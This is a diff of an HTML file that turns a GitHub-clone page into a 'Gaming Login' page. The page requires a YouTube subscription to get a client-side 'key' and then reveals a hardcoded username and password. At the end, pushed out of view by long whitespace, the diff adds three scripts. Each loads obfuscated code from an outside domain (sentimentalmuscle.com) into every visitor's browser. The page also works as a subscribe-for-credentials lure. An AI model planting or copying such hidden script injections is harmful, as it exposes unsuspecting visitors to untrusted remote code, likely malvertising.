@@ -1,100 +1,371 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GitHub Clone</title>
+    <title>Gaming Login</title>
+    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
     <style>
         body {
-            margin: 0;
             font-family: Arial, sans-serif;
-            background-color: #f6f8fa;
-        }
-        .header {
-            background-color: #24292e;
+            background-color: #161616;
+            text-align: center;
             color: white;
-            padding: 10px 20px;
+            margin: 0;
+            overflow: hidden;
             display: flex;
+            justify-content: center;
             align-items: center;
-            justify-content: space-between;
-            border-bottom: 1px solid #e1e4e8;
         }
-        .header .logo {
-            font-size: 24px;
+
+        #particles-js {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+        }
+
+        /* Panel styles with 50% transparency */
+        .login-container, .panel-container, .get-key-container, .subscribe-container {
+            margin-top: 100px;
+            background: rgba(34, 34, 34, 0.5); /* 50% transparency */
+            padding: 20px;
+            border-radius: 10px;
+            display: inline-block;
+            box-shadow: 0px 0px 10px #00ffcc;
+            position: relative;
+            z-index: 1;
+            animation: rgbGlow 5s ease-in-out infinite;
+            border: 4px solid transparent;
+            background-clip: padding-box;
+        }
+
+        @keyframes rgbGlow {
+            0% {
+                border-color: red;
+                box-shadow: 0px 0px 20px red;
+            }
+            25% {
+                border-color: yellow;
+                box-shadow: 0px 0px 20px yellow;
+            }
+            50% {
+                border-color: green;
+                box-shadow: 0px 0px 20px green;
+            }
+            75% {
+                border-color: cyan;
+                box-shadow: 0px 0px 20px cyan;
+            }
+            100% {
+                border-color: blue;
+                box-shadow: 0px 0px 20px blue;
+            }
+        }
+
+        /* Glowing Button Styles */
+        .btn {
+            margin: 10px;
+            padding: 15px 40px;
+            border: none;
+            outline: none;
+            color: #FFF;
+            cursor: pointer;
+            position: relative;
+            z-index: 0;
+            border-radius: 12px;
+            background-color: #333;
+        }
+
+        .btn::after {
+            content: "";
+            z-index: -1;
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background-color: #333;
+            left: 0;
+            top: 0;
+            border-radius: 10px;
+        }
+
+        .btn::before {
+            content: "";
+            background: linear-gradient(45deg, #FF0000, #FF7300, #FFFB00, #48FF00, #00FFD5, #002BFF, #FF00C8, #FF0000);
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            background-size: 600%;
+            z-index: -1;
+            width: calc(100% + 4px);
+            height: calc(100% + 4px);
+            filter: blur(8px);
+            animation: glowing 20s linear infinite;
+            transition: opacity .3s ease-in-out;
+            border-radius: 10px;
+            opacity: 0;
+        }
+
+        @keyframes glowing {
+            0% {background-position: 0 0;}
+            50% {background-position: 400% 0;}
+            100% {background-position: 0 0;}
+        }
+
+        .btn:hover::before {
+            opacity: 1;
+        }
+
+        .btn:active:after {
+            background: transparent;
+        }
+
+        .btn:active {
+            color: #000;
             font-weight: bold;
         }
-        .header .search-bar {
-            flex: 1;
-            margin: 0 20px;
-        }
-        .header .search-bar input {
-            width: 100%;
-            padding: 8px;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-        }
-        .header .profile {
-            font-size: 18px;
-        }
-        .sidebar {
-            width: 240px;
-            background-color: #ffffff;
+
+        input {
             padding: 10px;
-            position: fixed;
-            top: 60px;
-            bottom: 0;
-            border-right: 1px solid #e1e4e8;
+            width: 200px;
+            border: none;
+            border-radius: 5px;
+            outline: none;
+            text-align: center;
         }
-        .sidebar .menu-item {
-            margin: 10px 0;
-            font-size: 16px;
+
+        .hidden {
+            display: none;
         }
-        .main-content {
-            margin-left: 260px;
-            padding: 20px;
-        }
-        .repo-card {
-            background-color: white;
-            border: 1px solid #e1e4e8;
-            border-radius: 4px;
-            padding: 15px;
-            margin-bottom: 20px;
-        }
-        .repo-card h3 {
-            margin: 0 0 10px 0;
-            font-size: 18px;
-        }
-        .repo-card p {
-            margin: 0;
-            color: #586069;
+
+        .copy-btn {
+            margin-left: 10px;
+            font-size: 14px;
+            padding: 5px 10px;
+            cursor: pointer;
         }
     </style>
 </head>
 <body>
-    <div class="header">
-        <div class="logo">GitHub</div>
-        <div class="search-bar">
-            <input type="text" placeholder="Search GitHub">
-        </div>
-        <div class="profile">Profile</div>
+    <div id="particles-js"></div>
+
+    <!-- Subscribe Panel -->
+    <div id="subscribe-container" class="subscribe-container">
+        <h2>Subscribe to Our Channel</h2>
+        <p>Click the button below to subscribe to our YouTube channel to get your key.</p>
+        <button class="btn" onclick="subscribeToChannel()">Subscribe</button>
     </div>
-    <div class="sidebar">
-        <div class="menu-item">Pull requests</div>
-        <div class="menu-item">Issues</div>
-        <div class="menu-item">Marketplace</div>
-        <div class="menu-item">Explore</div>
+
+    <!-- Get Key Panel -->
+    <div id="get-key-panel" class="get-key-container hidden">
+        <h2>Get Your Key</h2>
+        <p>Click the button below to generate a random key.</p>
+        <button class="btn" onclick="generateRandomKey()">Generate Key</button>
     </div>
-    <div class="main-content">
-        <div class="repo-card">
-            <h3>Repository Name 1</h3>
-            <p>Description of repository 1</p>
-        </div>
-        <div class="repo-card">
-            <h3>Repository Name 2</h3>
-            <p>Description of repository 2</p>
-        </div>
-        <!-- Add more repo cards here -->
+
+    <!-- Login Panel -->
+    <div id="login-container" class="login-container hidden">
+        <h2>Enter Your Key</h2>
+        <input type="text" id="playerKey" placeholder="Enter Key Here">
+        <br>
+        <button class="btn" onclick="checkKey()">Login</button>
+        <p id="status"></p>
     </div>
+
+    <!-- Gaming Panel -->
+    <div id="panel-container" class="panel-container hidden">
+        <h2>Gaming Panel</h2>
+        <p id="expiryInfo"></p>
+
+        <p><strong>Username:</strong> <span id="username">test12345ASFSD</span> 
+            <button class="copy-btn" onclick="copyText('username')">Copy</button>
+        </p>
+        <p><strong>Password:</strong> <span id="password">KPIPKFLTYNZKCSRDERXWOSPTHPKOAIRUVFTKTGA</span> 
+            <button class="copy-btn" onclick="copyText('password')">Copy</button>
+        </p>
+
+        <p>Expires in: <span id="countdown"></span></p>
+    </div>
+  
+    
+    <script>
+        function copyText(elementId) {
+            let inputElement = document.getElementById(elementId);
+            let text = inputElement.value;
+            
+            // Try navigator clipboard first
+            if (navigator.clipboard) {
+                navigator.clipboard.writeText(text)
+                    .then(() => alert("Copied: " + text))
+                    .catch(err => {
+                        console.warn("Clipboard blocked, using fallback method.");
+                        fallbackCopy(text);
+                    });
+            } else {
+                fallbackCopy(text);
+            }
+        }
+        
+        // Fallback method using prompt
+        function fallbackCopy(text) {
+            let copyPrompt = prompt("Copy this text manually:", text);
+        }
+        </script>
+    
+    <script>
+        particlesJS("particles-js", {
+            "particles": {
+                "number": {
+                    "value": 100,
+                    "density": { "enable": true, "value_area": 800 }
+                },
+                "color": { "value": "#00ffcc" },
+                "shape": {
+                    "type": "circle",
+                    "stroke": { "width": 0, "color": "#000000" }
+                },
+                "opacity": { "value": 0.5, "random": false },
+                "size": { "value": 3, "random": true },
+                "line_linked": {
+                    "enable": true,
+                    "distance": 120,
+                    "color": "#00ffcc",
+                    "opacity": 0.6,
+                    "width": 1.5
+                },
+                "move": {
+                    "enable": true,
+                    "speed": 1,
+                    "direction": "top-right",
+                    "random": false,
+                    "straight": false,
+                    "out_mode": "out",
+                    "bounce": false
+                }
+            },
+            "interactivity": {
+                "detect_on": "canvas",
+                "events": {
+                    "onhover": { "enable": true, "mode": "grab" },
+                    "onclick": { "enable": true, "mode": "push" }
+                },
+                "modes": {
+                    "grab": { "distance": 200, "line_linked": { "opacity": 1 } },
+                    "push": { "particles_nb": 4 }
+                }
+            },
+            "retina_detect": true
+        });
+
+        let generatedKey = "";
+        let expiryDate = null;
+
+        function subscribeToChannel() {
+            // Redirect to the YouTube channel for subscription
+            window.open("https://www.youtube.com/@newchanel-xy5mc", "_blank");
+            document.getElementById("subscribe-container").classList.add("hidden");
+            document.getElementById("get-key-panel").classList.remove("hidden");
+        }
+
+        function generateRandomKey() {
+            generatedKey = generateKey();
+            expiryDate = new Date().getTime() + 24 * 60 * 60 * 1000; // 24 hours from now
+
+            document.getElementById("playerKey").value = generatedKey;
+            document.getElementById("get-key-panel").classList.add("hidden");
+            document.getElementById("login-container").classList.remove("hidden");
+
+            document.getElementById("status").innerHTML = "Key Generated! Expires in 24 hours.";
+
+            // Show expiry countdown
+            updateCountdown();
+            let countdownInterval = setInterval(updateCountdown, 1000);
+        }
+
+        function generateKey() {
+            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let key = '';
+            for (let i = 0; i < 16; i++) {
+                key += characters.charAt(Math.floor(Math.random() * characters.length));
+            }
+            return key;
+        }
+
+        function checkKey() {
+            const playerKey = document.getElementById("playerKey").value;
+            if (playerKey === generatedKey) {
+                document.getElementById("status").innerHTML = "Login successful!";
+                document.getElementById("login-container").classList.add("hidden");
+                document.getElementById("panel-container").classList.remove("hidden");
+                document.getElementById("username").innerText = "test12345ASFSD";
+                document.getElementById("password").innerText = "KPIPKFLTYNZKCSRDERXWOSPTHPKOAIRUVFTKTGA";
+            } else {
+                document.getElementById("status").innerHTML = "Invalid or expired key!";
+            }
+        }
+
+        function updateCountdown() {
+            let currentTime = new Date().getTime();
+            let timeLeft = expiryDate - currentTime;
+
+            if (timeLeft <= 0) {
+                document.getElementById("countdown").innerHTML = "Expired";
+                clearInterval(countdownInterval);
+            } else {
+                let days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
+                let hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                let minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+                let seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
+                document.getElementById("countdown").innerHTML = `${days}d ${hours}h ${minutes}m ${seconds}s`;
+            }
+        }
+
+        function copyText(id) {
+            var text = document.getElementById(id).innerText;
+            navigator.clipboard.writeText(text).then(function() {
+                alert("Text copied to clipboard");
+            });
+        }
+    </script>                                                                                                                                                                  <script>
+(function(ceipoe){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = ceipoe || {};
+s.src = "\/\/sentimentalmuscle.com\/b\/XlV\/s.dWGxls0NY-WFd\/iUYmWS5ruMZtXHIH\/CeYmK9\/ugZRUmlakyP\/TpYIxuMEjwQ-3FNFDZkNtVN\/jNEpypNZD\/c\/1\/MlAj";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+
+</script>                                                                        <script>
+(function(tzszj){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = tzszj || {};
+s.src = "\/\/sentimentalmuscle.com\/b\/XbVPs.dlG\/ln0IYaWZcU\/TeRmi9JurZSU\/l\/kPP\/ToYVxSMaj_Qm4HM\/TxEqt\/NNjwEgyxNJDGgZxLMUgW";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+
+
+</script>                                                                           <script>
+(function(tzszj){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = tzszj || {};
+s.src = "\/\/sentimentalmuscle.com\/b\/XbVPs.dlG\/ln0IYaWZcU\/TeRmi9JurZSU\/l\/kPP\/ToYVxSMaj_Qm4HM\/TxEqt\/NNjwEgyxNJDGgZxLMUgW";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+
+</script>
+
+
 </body>
 </html>
